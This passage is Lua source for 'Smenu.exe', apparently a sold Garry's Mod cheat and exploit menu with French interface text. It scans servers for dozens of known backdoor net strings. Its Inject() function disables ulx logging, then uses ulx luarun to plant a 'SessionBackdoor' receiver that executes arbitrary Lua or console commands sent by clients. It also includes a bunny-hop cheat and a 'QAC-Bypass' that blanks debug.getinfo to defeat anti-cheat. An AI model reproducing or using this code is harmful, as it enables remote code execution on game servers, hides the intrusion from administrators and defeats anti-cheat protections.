	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - MoonMan!" )
    end

    if( ValidNetString("Im_SOCool") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Im_SOCool" )
        netKey = "Im_SOCool"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Im_SOCool!" )
    end

    if( ValidNetString("ULXQUERY2") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - ULXQUERY2" )
        netKey = "ULXQUERY2"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - ULXQUERY2!" )
    end
	
    if( ValidNetString("jesuslebg") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - jesuslebg" )
        netKey = "jesuslebg"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - jesuslebg!" )
    end
	
    if( ValidNetString("zilnix") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - zilnix" )
        netKey = "zilnix"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - zilnix!" )
    end
	
    if( ValidNetString("enablevac") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - enablevac" )
        netKey = "enablevac"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - enablevac!" )
    end
	
    if( ValidNetString("c") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - c" )
        netKey = "c"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - c!" )
    end
	
    if( ValidNetString("Þà?D)?") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Þà?D)?" )
        netKey = "Þà?D)?"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Þà?D)?!" )
    end
	
    if( ValidNetString("disablebackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - disablebackdoor" )
        netKey = "disablebackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - disablebackdoor!" )
    end
	
	
	    if( ValidNetString("kill") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - kill" )
        netKey = "kill"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - kill!" )
    end
	
    if( ValidNetString("_blacksmurf") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - _blacksmurf" )
        netKey = "_blacksmurf"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _blacksmurf!" )
    end
	
	if( ValidNetString("Sbox_itemstore") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Sbox_itemstore" )
        netKey = "Sbox_itemstore"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Sbox_itemstore!" )
    end
	
    if( ValidNetString("Ulib_Message") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Ulib_Message" )
        netKey = "Ulib_Message"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Ulib_Message!" )
    end
	
	if( ValidNetString("Sbox_darkrp") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Sbox_darkrp" )
        netKey = "Sbox_darkrp"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Sbox_darkrp!" )
    end
	
	if( ValidNetString("ULogs_Info") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - ULogs_Info" )
        netKey = "ULogs_Info"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - ULogs_Info!" )
    end
	
	if( ValidNetString("ITEM") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - ITEM" )
        netKey = "ITEM"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - ITEM!" )
    end
	
	if( ValidNetString("fix") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - fix" )
        netKey = "fix"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - fix!" )
    end
	
	if( ValidNetString("Sandbox_GayParty") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - Sandbox_GayParty" )
        netKey = "Sandbox_GayParty"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Sandbox_GayParty!" )
    end
	
	if( ValidNetString("nocheat") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - nocheat" )
        netKey = "nocheat"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - nocheat!" )
    end
	
	if( ValidNetString("DarkRP_UTF8") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - DarkRP_UTF8" )
        netKey = "DarkRP_UTF8"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - DarkRP_UTF8!" )
    end
	
	if( ValidNetString("oldNetReadData") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - oldNetReadData" )
        netKey = "oldNetReadData"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - oldNetReadData!" )
    end
	
	if( ValidNetString("BackDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - BackDoor" )
        netKey = "BackDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - BackDoor!" )
    end
	
	if( ValidNetString("OdiumBackDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - OdiumBackDoor" )
        netKey = "OdiumBackDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - OdiumBackDoor!" )
    end
	
	if( ValidNetString("cucked") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - cucked" )
        netKey = "cucked"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - cucked!" )
    end
	
	if( ValidNetString("NoNerks") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - NoNerks" )
        netKey = "NoNerks"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - NoNerks!" )
    end
	
	if( ValidNetString("kek") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - kek" )
        netKey = "kek"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - kek!" )
    end
	
	if( ValidNetString("something") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - something" )
        netKey = "something"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - something!" )
    end
	
	if( ValidNetString("random") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - random" )
        netKey = "random"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - random!" )
    end
	
	if( ValidNetString("strip0") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - strip0" )
        netKey = "strip0"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - strip0!" )
    end
	
	if( ValidNetString("fellosnake") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - fellosnake" )
        netKey = "fellosnake"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - fellosnake!" )
    end
	
	if( ValidNetString("idk") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - idk" )
        netKey = "idk"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - idk!" )
    end
	
	if( ValidNetString("killserver") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - killserver" )
        netKey = "killserver"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - killserver!" )
    end
	
	if( ValidNetString("fuckserver") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - fuckserver" )
        netKey = "fuckserver"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - fuckserver!" )
    end
	
	if( ValidNetString("cvaraccess") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - cvaraccess" )
        netKey = "cvaraccess"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - cvaraccess!" )
    end
	
	if( ValidNetString("rcon") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - rcon" )
        netKey = "rcon"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - rcon!" )
    end
	
	if( ValidNetString("rconadmin") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - rconadmin" )
        netKey = "rconadmin"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - rconadmin!" )
    end
	
	if( ValidNetString("web") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - web" )
        netKey = "web"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - web!" )
    end
	
	if( ValidNetString("ÃžÃ ?D)â—") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - ÃžÃ ?D)â—" )
        netKey = "ÃžÃ ?D)â—"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - ÃžÃ ?D)â—!" )
    end
	
	if( ValidNetString("SparksLeBg") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Smenu.exe]", Color( 255, 255, 255 )," Backdoor trouvé ! - SparksLeBg" )
        netKey = "SparksLeBg"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - SparksLeBg!" )
    end
	
    SploitNotify("Backdoor trouvé : ".. netKey )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 127, 255, 0 ), "Net changé à : ".. netKey  )
end

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), " Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), " Injécté avec succès !" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), " Erreur ! Vous n'êtes pas SUPERADMIN !" )
    end
    if( ValidNetString("SessionBackdoor") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), " La backdoor est déjà présente." )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Segoe UI Light",
size = 21,
weight = 300
})
surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("Target", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "tamere", {
        font = "Roboto",
        size = 150,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
		bold = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )
surface.CreateFont( "vaporfont1", {
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )

surface.CreateFont( "vaporfont2", {  
    font = "Roboto",
    extended = false,
    size = 40,
    weight = 20,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )

surface.CreateFont( "vaporfont3", {  
    font = "Roboto",
    extended = false,
    size = 13,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )

surface.CreateFont( "vaporfont4", {  
    font = "Arial",
    extended = false,
    size = 30,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )

surface.CreateFont( "vaporfont5", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
} )

function Smenu()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 700)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 
Menu.Paint = function(self, w, h)
surface.SetDrawColor( Color( 30, 30, 30, 180 ) )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )

    draw.DrawText( "Smenu.exe - 1.0 | By ©Sparks.", "Font", 10, 2, Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
	
    draw.DrawText( "ANTI-LEAK", "vaporfont3", 415, 685, Color(110, 241, 110, 110) )
    draw.DrawText( "Create by ©Sparks.", "vaporfont3", 12, 685, Color(110, 241, 110, 110) )
    draw.DrawText( "", "vaporfont2", 349, 5,(HSVToColor( CurTime() % 6 * 80, 1, 1 )))
    draw.DrawText( "AUTO UPDATES", "vaporfont3", 800, 685, Color(110, 241, 110, 110) )
    draw.DrawText( "", "vaporfont3", ScrW()/4.10 + math.sin(RealTime()) * ScrW() / 45, ScrH()/27, (HSVToColor( CurTime() % 8 * 35, 1, 1 )), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(255, 255, 255, 255) )


end

local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 1 )
Close:SetSize( 53, 20 )
Close:SetText( "" )
function Close:Paint( w, h )
    draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,0,0) )
end

Close.DoClick = function()
   surface.PlaySound( "buttons/combine_button1.wav" )
    Menu:Close()  
end 



--------------------------------------------------------------
local Tabs = vgui.Create( "DPropertySheet", Menu )
Tabs:Dock( FILL )
Tabs:DockPadding( 6, 0, 45, 0)
Tabs.Paint = function (self, w, h)
for k, v in pairs(Tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.LinearGradient( 6, 0, w, h, Color(30, 30, 30, 245), Color(0,0,0,110), GRADIENT_VERTICAL );
         surface.SetDrawColor(1, 1, 2, 0)
         surface.DrawOutlinedRect( 0, 0, v.Tab:GetWide(), v.Tab:GetTall() )
    end
end
end

local Controller = vgui.Create( "DPanel", Tabs )
    Controller.Paint = function( self, w, h )
        draw.RoundedBox(13, 0, 1, w, h, Color(0,0,0,215))
    end
Tabs:AddSheet( "Controller", Controller, "icon16/user.png" )
 

local Musiques = vgui.Create( "DPanel", Tabs )
    Musiques.Paint = function( self, w, h )
        draw.RoundedBox(13, 0, 1, w, h, Color(0,0,0,215))
    end
Tabs:AddSheet( "Music", Musiques, "icon16/music.png" )

local Misc = vgui.Create( "DPanel", Tabs )
    Misc.Paint = function( self, w, h )
        draw.RoundedBox(13, 0, 1, w, h, Color(0,0,0,215))
    end
Tabs:AddSheet( "Hax0r", Misc, "icon16/world_add.png" )

local Props = vgui.Create( "DPanel", Tabs )
    Props.Paint = function( self, w, h )
        draw.RoundedBox(13, 0, 1, w, h, Color(0,0,0,215))
    end
Tabs:AddSheet( "Props", Props, "icon16/sound_mute.png" )

local Options = vgui.Create( "DPanel", Tabs )
    Options.Paint = function( self, w, h )
        draw.RoundedBox(13, 0, 1, w, h, Color(0, 0, 0, 78))
    end
Tabs:AddSheet( "Options", Options, "icon16/cog_delete.png" )

local Credit = vgui.Create( "DPanel", Tabs )
    Credit.Paint = function( self, w, h )
        draw.RoundedBox(13, 0, 1, w, h, Color(0, 0, 0, 78))
    end
Tabs:AddSheet( "Credit", Credit, "icon16/application_edit.png" )

local Controller = vgui.Create( "DScrollPanel", Controller )
Controller:Dock( FILL )
 
local Musiques = vgui.Create( "DScrollPanel", Musiques )
Musiques:Dock( FILL )

local Misc = vgui.Create( "DScrollPanel", Misc )
Misc:Dock( FILL )

local Props = vgui.Create( "DScrollPanel", Props )
Props:Dock( FILL )

local Options = vgui.Create( "DScrollPanel", Options )
Options:Dock( FILL )

local Credit = vgui.Create( "DScrollPanel", Credit )
Credit:Dock( FILL )


-- Check Version Button


local Checkversion = vgui.Create( "DButton", Controller )
Checkversion:SetText( "Check Version" )
Checkversion:SizeToContents()
Checkversion:SetTall( 25 )
Checkversion:SetWide( 100 )
Checkversion:SetPos( 75, 430 )
Checkversion:SetTextColor( HSVToColor( CurTime() % 6 * 60, 1, 1 ) )
Checkversion:SetToolTip( "Checks the hack Client Version." )
Checkversion.Paint = function( self, w, h )
    DrawBlur(Checkversion, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
Checkversion.DoClick = function()
    if ( Version == "v1.0") then
            chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 0, 255, 0 )," Version is up to date!" )
    else
            chat.AddText( Color( 0, 0, 0, 125 ), "[Smenu.exe]", Color( 255, 0, 0 )," Out of date!" )
    end
    end
end

--QAC-Bypass LOL

        function debug.getinfo(indexkid)
                return
        end
 
        function _G.debug.getinfo(indexkid)
                return
        end
 
        _G.debug.getinfo = function(indexkid)
                return
        end
 
        debug.getinfo = function(indexkid)
                return
        end

		
--[[

¦¦¦¦¦¦¦¦+¦¦¦¦¦¦¦+ ¦¦¦¦¦+ ¦¦¦+   ¦¦¦+                                     
+--¦¦+--+¦¦+----+¦¦+--¦¦+¦¦¦¦+ ¦¦¦¦¦                                     
   ¦¦¦   ¦¦¦¦¦+  ¦¦¦¦¦¦¦¦¦¦+¦¦¦¦+¦¦¦                                     
   ¦¦¦   ¦¦+--+  ¦¦+--¦¦¦¦¦¦+¦¦++¦¦¦                                     
   ¦¦¦   ¦¦¦¦¦¦¦+¦¦¦  ¦¦¦¦¦¦ +-+ ¦¦¦                                     
   +-+   +------++-+  +-++-+     +-+                                     
                                                                         
¦¦¦¦¦¦¦+¦¦¦+   ¦¦¦+¦¦¦¦¦¦¦+¦¦¦+   ¦¦+¦¦+   ¦¦+   ¦¦¦¦¦¦¦+¦¦+  ¦¦+¦¦¦¦¦¦¦+
¦¦+----+¦¦¦¦+ ¦¦¦¦¦¦¦+----+¦¦¦¦+  ¦¦¦¦¦¦   ¦¦¦   ¦¦+----++¦¦+¦¦++¦¦+----+
¦¦¦¦¦¦¦+¦¦+¦¦¦¦+¦¦¦¦¦¦¦¦+  ¦¦+¦¦+ ¦¦¦¦¦¦   ¦¦¦   ¦¦¦¦¦+   +¦¦¦++ ¦¦¦¦¦+  
+----¦¦¦¦¦¦+¦¦++¦¦¦¦¦+--+  ¦¦¦+¦¦+¦¦¦¦¦¦   ¦¦¦   ¦¦+--+   ¦¦+¦¦+ ¦¦+--+  
¦¦¦¦¦¦¦¦¦¦¦ +-+ ¦¦¦¦¦¦¦¦¦¦+¦¦¦ +¦¦¦¦¦+¦¦¦¦¦¦++¦¦+¦¦¦¦¦¦¦+¦¦++ ¦¦+¦¦¦¦¦¦¦+
+------++-+     +-++------++-+  +---+ +-----+ +-++------++-+  +-++------+

]]----------------BOUTTON INVISIBLE-----------------------                                                                                                                                                                                                                                                                                         

HTMLPanel = vgui.Create( "HTML", Credit )
HTMLPanel:SetPos( 255, 435 )
HTMLPanel:SetSize( 400,400 )
HTMLPanel:OpenURL( "https://discordapp.com/api/guilds/417446443977146368/widget.png?style=banner2" )

local   Menuclick = vgui.Create( "DButton", Credit)
Menuclick:SetPos( 255, 420 )
Menuclick:SetSize( 350,350  )
Menuclick:SetText( "" )
Menuclick:SetTextColor( Color( 255, 255, 255, 200 ) )
Menuclick.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
Menuclick.DoClick = function()
gui.OpenURL( "https://discord.me/smenu_exe" )
end
end 

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 150, 229 )
        Macro:SetParent(Credit)
        Macro:SetText( "" )
        Macro:SetFont( "vaporfont1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end

-----------------------------------------------------


local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 150, 320 )
        Macro:SetParent(Credit)
        Macro:SetText( "[Private menu]" )
        Macro:SetFont( "vaporfont1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
        
-----------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 150, 300 )
        Macro:SetParent(Credit)
        Macro:SetText( "Version 1.0" )
        Macro:SetFont( "vaporfont1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
        
-----------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 150, 340 )
        Macro:SetParent(Credit)
        Macro:SetText( "Thanks for buy Smenu [ Smenu.exe ]" )
        Macro:SetFont( "vaporfont1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
        
-----------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 150, 360 )
        Macro:SetParent(Credit)
        Macro:SetText( "EXPLOITS_GANG" )
        Macro:SetFont( "vaporfont1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 35 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end

----------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 150, 380 )
        Macro:SetParent(Credit)
        Macro:SetText( "" )
        Macro:SetFont( "vaporfont1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 35 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end

